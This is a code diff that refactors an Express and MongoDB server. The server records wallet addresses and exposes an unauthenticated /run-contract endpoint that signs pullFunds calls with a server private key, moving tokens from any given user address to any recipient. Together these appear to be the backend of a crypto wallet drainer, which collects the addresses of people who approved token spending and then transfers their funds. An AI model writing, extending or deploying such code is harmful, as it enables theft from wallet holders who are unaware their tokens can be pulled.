@@ -1,78 +1,99 @@
-const express = require("express");
-const mongoose = require("mongoose");
-const { ethers } = require("ethers");
-require("dotenv").config();
+import express from "express";
+import mongoose from "mongoose";
+import { ethers } from "ethers";
+import dotenv from "dotenv";
+
+dotenv.config();
 
 const app = express();
 app.use(express.json());
 
-// --------------------
-// DATABASE
-// --------------------
-mongoose.connect("mongodb://127.0.0.1:27017/mydb");
+// -----------------------------
+//  CONNECT MONGODB
+// -----------------------------
+async function connectDB() {
+  try {
+    await mongoose.connect(process.env.MONGO_URL);
+    console.log("MongoDB Connected");
+  } catch (err) {
+    console.error("MongoDB Connection Failed:", err.message);
+  }
+}
+connectDB();
 
-// Schema
+// -----------------------------
+//  USER MODEL
+// -----------------------------
 const UserSchema = new mongoose.Schema({
-    address: String,
-    timestamp: { type: Date, default: Date.now }
+  address: { type: String, required: true },
+  timestamp: { type: Date, default: Date.now },
 });
-const UserModel = mongoose.model("users", UserSchema);
+const UserModel = mongoose.model("User", UserSchema);
 
-// --------------------
-// API: RECEIVE ADDRESS
-// --------------------
+// -----------------------------
+//  STORE USER
+// -----------------------------
 app.post("/store-user", async (req, res) => {
-    try {
-        const { address } = req.body;
+  try {
+    const { address } = req.body;
 
-        await UserModel.create({ address });
+    if (!address) return res.json({ success: false, error: "Address required" });
 
-        res.json({ success: true, saved: address });
-    } catch (err) {
-        res.json({ success: false, error: err.message });
-    }
+    await UserModel.create({ address });
+
+    res.json({
+      success: true,
+      message: "Address saved",
+      address,
+    });
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
 });
 
-// --------------------
-// BLOCKCHAIN SETUP (SAFE USE ONLY)
-// --------------------
-const provider = new ethers.JsonRpcProvider(process.env.RPC);
-const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
+// -----------------------------
+//  CONTRACT SETUP
+// -----------------------------
+let contract;
+try {
+  const provider = new ethers.JsonRpcProvider(process.env.RPC);
+  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
 
-const contractAddress = process.env.CONTRACT;
-const abi = [
-  "function pullFunds(address token, address user, address recipient, uint256 amount) external"
-];
+  const abi = [
+    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
+  ];
 
-const contract = new ethers.Contract(contractAddress, abi, wallet);
+  contract = new ethers.Contract(process.env.CONTRACT, abi, wallet);
+  console.log("Contract Connected");
+} catch (err) {
+  console.error("Contract setup failed:", err.message);
+}
 
-// --------------------
-// API: PERFORM CONTRACT CALL
-// --------------------
+// -----------------------------
+//  RUN CONTRACT
+// -----------------------------
 app.post("/run-contract", async (req, res) => {
-    try {
-        const { token, user, recipient, amount } = req.body;
+  try {
+    const { token, user, recipient, amount } = req.body;
 
-        console.log("Sending TX…");
+    if (!token || !user || !recipient || !amount)
+      return res.json({ success: false, error: "All fields required" });
 
-        const tx = await contract.pullFunds(
-            token,
-            user,
-            recipient,
-            amount
-        );
+    const tx = await contract.pullFunds(token, user, recipient, amount);
+    await tx.wait();
 
-        await tx.wait();
-
-        res.json({
-            success: true,
-            hash: tx.hash
-        });
-
-    } catch (err) {
-        res.json({ success: false, error: err.message });
-    }
+    res.json({
+      success: true,
+      message: "Transaction sent",
+      hash: tx.hash,
+    });
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
 });
 
-// --------------------
-app.listen(3000, () => console.log("Server running on port 3000"));
+// -----------------------------
+//  START SERVER
+// -----------------------------
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on PORT ${PORT}`));
